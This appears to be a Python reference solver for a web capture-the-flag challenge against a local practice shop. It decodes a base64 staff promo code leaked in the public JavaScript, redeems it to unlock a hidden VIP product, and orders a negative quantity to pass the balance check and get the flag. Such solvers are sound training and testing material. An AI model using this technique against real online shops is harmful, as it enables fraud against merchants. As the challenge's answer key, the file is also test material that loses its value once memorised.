#!/usr/bin/env python3
"""Reference solver for the Web challenge.

Reasoning chain:
1. The front-end source leaks a base64 "staff referral seed"; decode it.
2. Redeem it to unlock the hidden VIP SKU.
3. The order endpoint accepts a negative quantity, so price * qty is negative
   and passes the "total > balance" check, returning the flag.
"""
from __future__ import annotations

import argparse
import base64
import json
import re
import urllib.error
import urllib.request

FLAG_RE = re.compile(r"flag\{[^}]+\}")


def request(url: str, method: str = "GET", body: dict | None = None, token: str = "") -> dict:
    data = None if body is None else json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as exc:
        detail = exc.read().decode(errors="replace")
        raise RuntimeError(f"{method} {url} -> HTTP {exc.code}: {detail}") from exc


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:8080", help="base URL of the shop")
    args = ap.parse_args()
    base = args.url.rstrip("/")

    print("[1] Fetching public JavaScript and looking for the staff seed ...")
    with urllib.request.urlopen(base + "/static/app.js", timeout=10) as resp:
        js = resp.read().decode()
    match = re.search(r'STAFF_PROMO\s*=\s*"([A-Za-z0-9+/=]+)"', js)
    if not match:
        raise SystemExit("could not find STAFF_PROMO in app.js")
    promo = base64.b64decode(match.group(1)).decode()
    print(f"    decoded promo code: {promo}")

    print("[2] Logging in and redeeming the staff promo ...")
    login = request(base + "/api/login", "POST", {"name": "solver"})
    token = login["token"]
    redeemed = request(base + "/api/redeem", "POST", {"code": promo}, token)
    if not redeemed.get("vip"):
        raise SystemExit(f"redeem did not unlock VIP: {redeemed}")

    print("[3] Reading the unlocked catalog ...")
    catalog = request(base + "/api/products", token=token)
    vip = [p for p in catalog["products"] if p.get("kind") == "vip"]
    if not vip:
        raise SystemExit(f"no VIP product in catalog: {catalog}")
    product = vip[0]
    print(f"    hidden SKU: {product['id']} / {product['name']} / {product['price']} cents")

    print("[4] Ordering a negative quantity to pass the balance check ...")
    order = request(
        base + "/api/order",
        "POST",
        {"product_id": product["id"], "qty": -1},
        token,
    )
    print(f"    total returned by server: {order.get('total')}")
    flag = order.get("flag", "")
    if not FLAG_RE.fullmatch(flag):
        raise SystemExit(f"server did not return a flag: {order}")
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    main()
